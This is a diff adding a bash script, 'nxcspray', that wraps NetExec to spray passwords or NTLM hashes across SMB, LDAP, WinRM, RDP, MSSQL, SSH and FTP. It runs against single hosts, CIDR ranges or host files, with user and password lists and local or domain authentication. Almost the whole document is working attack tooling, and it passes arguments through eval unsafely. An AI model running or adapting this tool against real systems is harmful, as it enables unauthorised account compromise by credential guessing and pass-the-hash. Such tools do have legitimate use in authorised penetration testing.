@@ -1,0 +1,263 @@
+#!/bin/bash
+
+# Usage:
+#   nxcspray <protocols|all> <targets> -u <username|file> -p <password|file>
+#   nxcspray <protocols|all> <targets> -u <username|file> -H <hash|file>
+#
+# Examples:
+#   nxcspray all 10.10.10.10 -u bob -p password
+#   nxcspray all 10.10.10.0/24 -u bob -p password
+#   nxcspray all 10.10.10.1-25 -u bob -p password
+#   nxcspray all hosts.txt -u bob -p password
+#   nxcspray all hosts.txt -u users.txt -p passwords.txt   # file spray
+#   nxcspray smb,ldap,winrm hosts.txt -u bob -H ntlmhash
+#   nxcspray smb 10.10.10.10 -u bob -H ntlmhash --local-auth
+#   nxcspray smb 10.10.10.10 -u bob -p password --both
+#   nxcspray smb 10.10.10.10 -u bob -p password --no-bruteforce
+#   nxcspray smb 10.10.10.10 -u bob -p password --continue-on-success
+#   nxcspray smb 10.10.10.10 -u bob -p password --no-port-check
+
+# ---- Protocol -> Port Mapping ----
+proto_port() {
+    case "$1" in
+        smb)   echo "445" ;;
+        ldap)  echo "389" ;;
+        winrm) echo "5985" ;;
+        rdp)   echo "3389" ;;
+        mssql) echo "1433" ;;
+        ssh)   echo "22" ;;
+        ftp)   echo "21" ;;
+        *)     echo "" ;;
+    esac
+}
+
+# ---- Local Auth Support Check ----
+supports_local_auth() {
+    case "$1" in
+        smb|winrm|rdp|mssql) return 0 ;;
+        ldap|ssh|ftp) return 1 ;;
+        *) return 1 ;;
+    esac
+}
+
+# ---- Port Check (3s timeout) ----
+port_open() {
+    local HOST="$1"
+    local PORT="$2"
+    timeout 3 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null
+}
+
+# ---- WinRM Port Check (5985 then 5986 fallback) ----
+winrm_port_open() {
+    local HOST="$1"
+    if port_open "$HOST" "5985"; then
+        echo "5985"
+        return 0
+    elif port_open "$HOST" "5986"; then
+        echo "5986"
+        return 0
+    fi
+    return 1
+}
+
+# ---- Argument Validation ----
+if [ "$#" -lt 4 ]; then
+    echo "[-] Usage: $0 <protocols|all> <targets> -u <username|file> [-p <password|file>|-H <hash|file>] [--local-auth|--both] [--no-bruteforce] [--continue-on-success] [--no-port-check]"
+    exit 1
+fi
+
+PROTOS_RAW="$1"
+TARGETS_RAW="$2"
+shift 2
+
+USER=""
+PASS=""
+HASH=""
+LOCAL_AUTH=""
+BOTH=""
+NO_BRUTEFORCE=""
+CONTINUE_ON_SUCCESS=""
+NO_PORT_CHECK=""
+
+# Pull out long flags before getopts
+REMAINING_ARGS=()
+for arg in "$@"; do
+    case "$arg" in
+        --local-auth)          LOCAL_AUTH="--local-auth" ;;
+        --both)                BOTH="true" ;;
+        --no-bruteforce)       NO_BRUTEFORCE="--no-bruteforce" ;;
+        --continue-on-success) CONTINUE_ON_SUCCESS="--continue-on-success" ;;
+        --no-port-check)       NO_PORT_CHECK="true" ;;
+        *)                     REMAINING_ARGS+=("$arg") ;;
+    esac
+done
+
+while getopts "u:p:H:" opt "${REMAINING_ARGS[@]}"; do
+    case $opt in
+        u) USER="$OPTARG" ;;
+        p) PASS="$OPTARG" ;;
+        H) HASH="$OPTARG" ;;
+        *)
+            echo "[-] Invalid flag"
+            exit 1
+            ;;
+    esac
+done
+
+if [ -z "$USER" ]; then
+    echo "[-] Missing required flag: -u <username>"
+    exit 1
+fi
+
+if [ -z "$PASS" ] && [ -z "$HASH" ]; then
+    echo "[-] Must provide either -p <password> or -H <hash>"
+    exit 1
+fi
+
+if [ -n "$PASS" ] && [ -n "$HASH" ]; then
+    echo "[-] Cannot use both -p and -H at the same time"
+    exit 1
+fi
+
+if [ -n "$LOCAL_AUTH" ] && [ -n "$BOTH" ]; then
+    echo "[-] Cannot use --local-auth and --both at the same time"
+    exit 1
+fi
+
+# ---- Build auth flag ----
+# If value is a file — pass unquoted so nxc reads it as a file
+# If value is a string — pass quoted to preserve special chars
+if [ -n "$HASH" ]; then
+    if [ -f "$HASH" ]; then
+        AUTH_FLAG="-H $HASH"
+    else
+        AUTH_FLAG="-H '$HASH'"
+    fi
+    AUTH_TYPE="hash"
+else
+    if [ -f "$PASS" ]; then
+        AUTH_FLAG="-p $PASS"
+    else
+        AUTH_FLAG="-p '$PASS'"
+    fi
+    AUTH_TYPE="password"
+fi
+
+# User flag — file or single value
+if [ -f "$USER" ]; then
+    USER_FLAG="-u $USER"
+    AUTH_TYPE="$AUTH_TYPE (users: file)"
+else
+    USER_FLAG="-u '$USER'"
+fi
+
+# ---- Extra nxc flags ----
+EXTRA_FLAGS="$NO_BRUTEFORCE $CONTINUE_ON_SUCCESS"
+
+# ---- Protocol Handling ----
+if [ "$PROTOS_RAW" = "all" ]; then
+    PROTO_ARRAY=(smb ldap winrm rdp mssql ssh ftp)
+else
+    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
+fi
+
+# ---- Target Expansion ----
+expand_targets() {
+    local input="$1"
+    if [[ "$input" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
+        python3 -c "
+import ipaddress
+for ip in ipaddress.IPv4Network('$input', strict=False).hosts():
+    print(ip)
+"
+    elif [[ "$input" =~ ^([0-9]+\.[0-9]+\.[0-9]+\.)([0-9]+)-([0-9]+)$ ]]; then
+        local base="${BASH_REMATCH[1]}"
+        local start="${BASH_REMATCH[2]}"
+        local end="${BASH_REMATCH[3]}"
+        for i in $(seq "$start" "$end"); do
+            echo "${base}${i}"
+        done
+    else
+        echo "$input"
+    fi
+}
+
+# ---- Target Handling ----
+RAW_TARGETS=()
+if [ -f "$TARGETS_RAW" ]; then
+    while IFS= read -r line || [ -n "$line" ]; do
+        [[ -z "$line" || "$line" =~ ^# ]] && continue
+        RAW_TARGETS+=("$line")
+    done < "$TARGETS_RAW"
+else
+    RAW_TARGETS+=("$TARGETS_RAW")
+fi
+
+TARGETS=""
+for entry in "${RAW_TARGETS[@]}"; do
+    expanded=$(expand_targets "$entry")
+    TARGETS="$TARGETS $expanded"
+done
+TARGETS="${TARGETS# }"
+
+# ---- Spray Function ----
+spray() {
+    local PROTO="$1"
+    local TARGET="$2"
+    local AUTH_EXTRA="$3"
+    local LABEL="$4"
+    local PORT_OVERRIDE="$5"
+    echo "    -> [$LABEL] $TARGET"
+    if [ -n "$PORT_OVERRIDE" ]; then
+        eval nxc "$PROTO" "$TARGET" --port "$PORT_OVERRIDE" $USER_FLAG $AUTH_FLAG $AUTH_EXTRA $EXTRA_FLAGS
+    else
+        eval nxc "$PROTO" "$TARGET" $USER_FLAG $AUTH_FLAG $AUTH_EXTRA $EXTRA_FLAGS
+    fi
+}
+
+# ---- Spray Loop ----
+for PROTO in "${PROTO_ARRAY[@]}"; do
+    PORT=$(proto_port "$PROTO")
+    echo "[+] Spraying protocol: $PROTO (port: ${PORT:-?}) (auth: $AUTH_TYPE)${NO_BRUTEFORCE:+ [no-bruteforce]}${CONTINUE_ON_SUCCESS:+ [continue-on-success]}${NO_PORT_CHECK:+ [no-port-check]}"
+
+    for TARGET in $TARGETS; do
+        # WinRM special case — check 5985 then fall back to 5986
+        if [ "$PROTO" = "winrm" ] && [ -z "$NO_PORT_CHECK" ]; then
+            WINRM_PORT=$(winrm_port_open "$TARGET")
+            if [ $? -ne 0 ]; then
+                echo "    [SKIP] $TARGET:5985/5986 both closed — skipping winrm"
+                continue
+            fi
+            if [ "$WINRM_PORT" = "5986" ]; then
+                echo "    [INFO] $TARGET using WinRM port 5986 (HTTPS)"
+            fi
+            if [ -n "$BOTH" ]; then
+                spray "$PROTO" "$TARGET" "" "domain" "$WINRM_PORT"
+                spray "$PROTO" "$TARGET" "--local-auth" "local" "$WINRM_PORT"
+            else
+                spray "$PROTO" "$TARGET" "$LOCAL_AUTH" "domain" "$WINRM_PORT"
+            fi
+            continue
+        fi
+
+        if [ -z "$NO_PORT_CHECK" ] && [ -n "$PORT" ]; then
+            if ! port_open "$TARGET" "$PORT"; then
+                echo "    [SKIP] $TARGET:$PORT closed — skipping $PROTO"
+                continue
+            fi
+        fi
+
+        if [ -n "$BOTH" ]; then
+            spray "$PROTO" "$TARGET" "" "domain"
+            if supports_local_auth "$PROTO"; then
+                spray "$PROTO" "$TARGET" "--local-auth" "local"
+            fi
+        else
+            if [ -n "$LOCAL_AUTH" ] && ! supports_local_auth "$PROTO"; then
+                echo "    [SKIP] $PROTO does not support --local-auth"
+                continue
+            fi
+            spray "$PROTO" "$TARGET" "$LOCAL_AUTH" "domain"
+        fi
+    done
+done
